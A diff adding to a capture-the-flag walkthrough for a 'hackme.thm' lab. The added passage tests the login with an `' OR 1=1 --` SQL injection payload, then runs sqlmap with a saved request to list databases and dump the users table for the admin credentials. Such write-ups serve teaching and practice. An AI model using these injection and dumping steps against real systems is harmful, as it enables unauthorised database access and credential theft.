@@ -96,7 +96,41 @@ gobuster dir -u http://admin1337special.hackme.thm:40009/public/html -w /usr/sha
 After navigating to the `login.php` page we are prompted for an authentication code and
 choose to submit the secure token from the previous task. With this, we are prompted with
 another login screen. At first, we attempt `admin:admin` for the credentials but just
-get a popup that either the username or password are invalid. And so, we ...tbc
+get a popup that either the username or password are invalid. And so, we try out a few
+common credentials without any success. Since the client side does not appear to be
+vulnerable on first sight, we suspect a possible *SQLi* attack and try out `' OR 1=1 --`
+for the username. This does not help us log in, but it does not show the usual alert
+message either, so we assume we're on the right track. So, we copy the *Request Headers*
+with the *JSON Body* into a text file and use it in `sqlmap`.
+```
+$ cat request_headers.txt 
+POST /api/login.php HTTP/1.1
+Host: admin1337special.hackme.thm:40009
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Referer: http://admin1337special.hackme.thm:40009/public/html/login
+Content-Type: application/json
+Content-Length: 39
+Origin: http://admin1337special.hackme.thm:40009
+Connection: keep-alive
+Cookie: PHPSESSID=[REDACTED]
+Priority: u=0
+
+{"username":"admin","password":"sample"}
+
+$ sqlmap -r request_headers.txt --dbs --batch
+```
+After some probing of the JSON username, `sqlmap` finds a vulnerability and is able to
+thus obtain six databases, most notably the *hackme* database. Next, we want to print all
+tables from it with `sqlmap -r request_headers.txt -D hackme --tables` and discover a
+*config* and *users* table. Since, we want to find out the *admin* password for the login
+request, we print the *users* table with 
+`sqlmap -r request_headers.txt -D hackme -T users --dump`. This way, we are able to
+obtain the credentails for the admin user with the email address `admin@hackme.thm` with
+which we can log in and then activate the new sign up feature. Having done this, we can
+finally visit the `hackme.thm` website and get rewarded with the flag.
 
 Detection
 -----------------------------------------------------------------------------------------
